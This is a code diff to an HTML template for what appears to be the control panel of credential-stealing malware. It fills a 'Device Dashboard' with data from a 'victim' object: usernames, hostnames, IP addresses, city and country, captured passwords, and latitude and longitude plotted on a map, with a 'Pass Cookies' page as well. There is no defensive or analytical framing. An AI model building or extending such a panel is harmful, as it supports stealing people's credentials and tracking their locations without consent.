@@ -5,6 +5,9 @@
     <meta name="viewport" content="width=device-width, initial-scale=1" />
     <title>Device Dashboard</title>
     <link rel="stylesheet" href="/static/overview.css">
+    <link rel="stylesheet" href="https://unpkg.com/leaflet/dist/leaflet.css" />
+    <script src="https://cdn.jsdelivr.net/npm/chart.js"></script>
+    <script src="https://unpkg.com/leaflet/dist/leaflet.js"></script>
 </head>
 <body>
     <div class="container">
@@ -17,12 +20,12 @@
             </div>
             <div class="nav-menu"></div>
             <nav class="sidebar-nav">
-                <a class="nav-item active" href="/overview">Overview</a>
-                <a class="nav-item" href="/device">Device Info</a>
-                <a class="nav-item" href="/history">History</a>
-                <a class="nav-item" href="/network">Network</a>
-                <a class="nav-item" href="/location">Location</a>
-                <a class="nav-item" href="/passcookies">Pass Cookies</a>
+                <a class="nav-item active" href="/overview?id={{ victim.id }}">Overview</a>
+                <a class="nav-item" href="/device?id={{ victim.id }}">Device Info</a>
+                <a class="nav-item" href="/history?id={{ victim.id }}">History</a>
+                <a class="nav-item" href="/network?id={{ victim.id }}">Network</a>
+                <a class="nav-item" href="/location?id={{ victim.id }}">Location</a>
+                <a class="nav-item" href="/passcookies?id={{ victim.id }}">Pass Cookies</a>
             </nav>
             
             <div class="back-button">
@@ -38,19 +41,19 @@
                     <div class="info-card username-card">
                         <div class="card-content">
                             <div>
-                                <div class="label">Username:</div>
-                                <div class="label">Hostname:</div>
+                                <div class="label">Username: {{ victim.username }}</div>
+                                <div class="label">Hostname: {{ victim.hostname }}</div>
                             </div>
                             <div class="card-icon">👤</div>
                         </div>
                     </div>
-                    
+
                     <div class="info-card location-card">
                         <div class="card-content">
                             <div>
-                                <div class="label">City:</div>
-                                <div class="label">Region:</div>
-                                <div class="label">Country:</div>
+                                <div class="label">City: {{ victim.city }}</div>
+                                <div class="label">Region: {{ victim.region }}</div>
+                                <div class="label">Country: {{ victim.country }}</div>
                             </div>
                             <div class="card-icon">📍</div>
                         </div>
@@ -58,7 +61,7 @@
                     
                     <div class="info-card os-card">
                         <div class="card-content">
-                            <div class="label">Operating System:</div>
+                            <div class="label">Operating System: {{ victim.os }}</div>
                             <div class="card-icon">💻</div>
                         </div>
                     </div>
@@ -66,8 +69,8 @@
                     <div class="info-card ip-card">
                         <div class="card-content">
                             <div>
-                                <div class="label">Local IP:</div>
-                                <div class="label">Public IP:</div>
+                                <div class="label">Local IP: {{ victim.local_ip }}</div>
+                                <div class="label">Public IP: {{ victim.public_ip or 'N/A' }}</div>
                             </div>
                             <div class="card-icon">🌐</div>
                         </div>
@@ -96,22 +99,9 @@
                 <section class="location-section">
                     <h2>Location</h2>
                     <div class="map-container">
-                        <div class="map-placeholder">
-                            <div class="map-content">
-                                <div class="map-info">
-                                    <p>📍 You</p>
-                                    <p>🌐 Connecting with Batam, Provisional Rest</p>
-                                    <p>📶 Your real IP:</p>
-                                </div>
-                                <div class="map-visual">
-                                    <div class="location-marker batam">Batam</div>
-                                    <div class="location-marker singapore">Singapore</div>
-                                    <div class="location-marker kuala-lumpur">Kuala Lumpur</div>
-                                    <div class="connection-line"></div>
-                                </div>
-                            </div>
-                        </div>
+                        <div id="map"></div>
                     </div>
+
                 </section>
 
                 <section class="password-section">
@@ -121,8 +111,8 @@
                             <div class="entry-info">
                                 <div class="url">Url :</div>
                                 <div class="credentials">
-                                    <span>Username : xyz_xyzxyzxyz</span>
-                                    <span>Password : 1234567890</span>
+                                    <span>Username : {{ victim.usernames }}</span>
+                                    <span>Password : {{ victim.passwords }}</span>
                                 </div>
                             </div>
                             <div class="entry-icon">🔒</div>
@@ -134,65 +124,58 @@
     </div>
 
     <script>
-        const canvas = document.getElementById('networkChart');
-        const ctx = canvas.getContext('2d');
-        
+        const ctx = document.getElementById('networkChart').getContext('2d');
+
+        const labels = ['Item 1', 'Item 2', 'Item 3', 'Item 4', 'Item 5'];
         const packetSent = [25, 30, 15, 28, 30];
         const packetReceive = [18, 26, 23, 35, 32];
-        const labels = ['Item 1', 'Item 2', 'Item 3', 'Item 4', 'Item 5'];
-        
-        const chartWidth = 500;
-        const chartHeight = 150;
-        const padding = 50;
-        const maxValue = 40;
-        
-        ctx.strokeStyle = '#e0e0e0';
-        ctx.lineWidth = 1;
-        
-        for (let i = 0; i <= 4; i++) {
-            const y = padding + (i * chartHeight / 4);
-            ctx.beginPath();
-            ctx.moveTo(padding, y);
-            ctx.lineTo(padding + chartWidth, y);
-            ctx.stroke();
-            
-            ctx.fillStyle = '#666';
-            ctx.font = '12px Arial';
-            ctx.fillText((maxValue - i * 10).toString(), 20, y + 5);
-        }
-        
-        function drawLine(data, color) {
-            ctx.strokeStyle = color;
-            ctx.lineWidth = 3;
-            ctx.beginPath();
-            
-            for (let i = 0; i < data.length; i++) {
-                const x = padding + (i * chartWidth / (data.length - 1));
-                const y = padding + chartHeight - (data[i] / maxValue * chartHeight);
-                
-                if (i === 0) {
-                    ctx.moveTo(x, y);
-                } else {
-                    ctx.lineTo(x, y);
+
+        const data = {
+            labels: labels,
+            datasets: [
+                {
+                    label: 'Packet Sent',
+                    data: packetSent,
+                    borderColor: '#4A90E2',
+                    backgroundColor: '#4A90E2',
+                    fill: false,
+                    tension: 0.3
+                },
+                {
+                    label: 'Packet Receive',
+                    data: packetReceive,
+                    borderColor: '#8B4513',
+                    backgroundColor: '#8B4513',
+                    fill: false,
+                    tension: 0.3
                 }
-                
-                ctx.fillStyle = color;
-                ctx.beginPath();
-                ctx.arc(x, y, 4, 0, 2 * Math.PI);
-                ctx.fill();
+            ]
+        };
+
+        const config = {
+            type: 'line',
+            data: data,
+            options: {
+                animation: {
+                    duration: 1500, 
+                },
+                scales: {
+                    y: {
+                        beginAtZero: true
+                    }
+                }
             }
-            ctx.stroke();
-        }
+        };
+
+        new Chart(ctx, config);
         
-        drawLine(packetSent, '#4A90E2');
-        drawLine(packetReceive, '#8B4513');
-        
-        ctx.fillStyle = '#666';
-        ctx.font = '12px Arial';
-        for (let i = 0; i < labels.length; i++) {
-            const x = padding + (i * chartWidth / (labels.length - 1));
-            ctx.fillText(labels[i], x - 20, padding + chartHeight + 20);
-        }
+        const map = L.map('map').setView([{{ victim.latitude }}, {{ victim.longitude }}], 13);
+
+        L.tileLayer('https://{s}.tile.openstreetmap.org/{z}/{x}/{y}.png', {
+            attribution: '© OpenStreetMap contributors'
+        }).addTo(map);
+
+        L.marker([{{ victim.latitude }}, {{ victim.longitude }}]).addTo(map)
+            .openPopup();
     </script>
-</body>
-</html>
+    
